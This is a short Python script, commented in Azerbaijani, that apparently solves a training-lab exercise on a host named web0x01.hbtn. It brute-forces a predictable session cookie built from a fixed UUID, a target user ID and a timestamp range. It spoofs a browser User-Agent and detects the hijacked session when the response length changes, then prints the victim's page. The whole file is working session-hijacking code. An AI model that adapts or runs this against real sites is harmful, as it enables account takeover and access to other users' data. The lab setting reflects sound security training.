import requests
import sys

# Hədəf URL
url = "http://web0x01.hbtn/a1/hijack_session"

# Sabit hissələr
base_uuid = "3f877254-08c4-4e14-8bc"
target_id = "2093917"  # Aradakı itmiş ID

# Timestamp aralığı (Sənin verdiyin iki dəyər)
start_ts = 17686711363
end_ts   = 17686711543

# Serverin bizi robot kimi görməməsi üçün başlıq
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

print(f"Hədəf ID: {target_id}")
print(f"Timestamp Aralığı: {start_ts} -> {end_ts} (Cəmi {end_ts - start_ts} ehtimal)")
print("-" * 60)

found = False

# Aralıqdakı hər bir millisaniyəni yoxlayırıq
for ts in range(start_ts, end_ts + 1):
    
    # Cookie-ni formalaşdırırıq
    cookie_val = f"{base_uuid}-{target_id}-{ts}"
    cookies = {'hijack_session': cookie_val}
    
    try:
        # Sorğunu göndəririk
        response = requests.get(url, cookies=cookies, headers=headers)
        length = len(response.text)
        
        # Proqres barı (Hər sorğuda ekrana basmayaq, qarışıqlıq olmasın)
        sys.stdout.write(f"\rYoxlanılır: {ts} | Uzunluq: {length}")
        sys.stdout.flush()
        
        # Əgər uzunluq 2597-dən (standart səhifədən) fərqlidirsə, deməli tapdıq!
        if length != 2597:
            print(f"\n\n[!!!] BINGO! DOĞRU SESSİYA TAPILDI!")
            print(f"COOKIE: {cookie_val}")
            print("-" * 30)
            print("Səhifə Mətni:")
            print(response.text) # Cavabı ekrana basırıq
            found = True
            break
            
    except Exception as e:
        print(f"\nXəta: {e}")

if not found:
    print("\n\nTəəssüf ki, bu aralıqda uyğun timestamp tapılmadı.")
else:
    print("\nƏməliyyat uğurla bitdi.")
